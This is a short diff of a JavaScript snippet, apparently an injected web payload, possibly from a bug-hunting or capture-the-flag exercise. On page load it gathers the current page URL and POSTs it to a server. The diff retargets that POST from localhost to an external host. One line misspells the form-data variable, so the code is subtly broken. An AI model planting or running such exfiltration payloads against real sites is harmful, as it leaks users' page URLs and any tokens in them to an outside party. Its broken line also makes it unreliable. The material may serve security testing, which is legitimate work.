@@ -9,7 +9,7 @@ document.onload = function () {
 	formData.append("creator", "fromBot2");
 	foremData.append("body", window.location.href);
 
-	fetch("http://127.0.0.1:9000/comment/ca5c0e56-eeaa-4bbc-a629-43de84db56c7",{
+	fetch("https://unknowncontainer.br2.bughuntr.net/comment/ca5c0e56-eeaa-4bbc-a629-43de84db56c7",{
 		method: 'POST',
 		body: formData
 	});
